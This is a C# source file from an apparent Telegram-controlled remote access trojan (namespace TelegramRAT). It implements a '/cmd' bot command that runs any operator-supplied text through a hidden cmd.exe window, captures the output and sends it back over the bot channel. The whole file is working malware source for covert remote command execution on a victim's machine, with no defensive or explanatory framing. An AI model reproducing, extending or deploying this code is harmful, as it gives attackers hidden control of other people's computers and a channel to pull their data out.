using System.Diagnostics;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.Misc;

public class CmdCommand(IBotNotificationService notificationService) : AbstractBotCommand
{
    public override string Command => "cmd";
    public override string Description => "Run cmd commands.";
    public override string Example => "/cmd dir";
    public override int ArgsCount => -2;

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c " + model.RawArgs,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false
                }
            };
            process.Start();
            await notificationService.SendSuccessAsync(model.Message, "Command execution started.");

            var outputTask = process.StandardOutput.ReadToEndAsync();
            var errorTask = process.StandardError.ReadToEndAsync();

            await Task.WhenAll(outputTask, errorTask, process.WaitForExitAsync());

            var output = outputTask.Result;
            var error = errorTask.Result;
            var combinedOutput = string.IsNullOrWhiteSpace(output) ? error : output;
            combinedOutput = combinedOutput.Length > 4096 ? combinedOutput[..4096] : combinedOutput;

            if (string.IsNullOrWhiteSpace(combinedOutput))
                await notificationService.SendSuccessAsync(model.Message, "Command executed successfully with no output.");
            else
                await notificationService.SendSuccessAsync(model.Message, $"Command executed successfully.\n\nOutput:\n{combinedOutput}");
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }
}
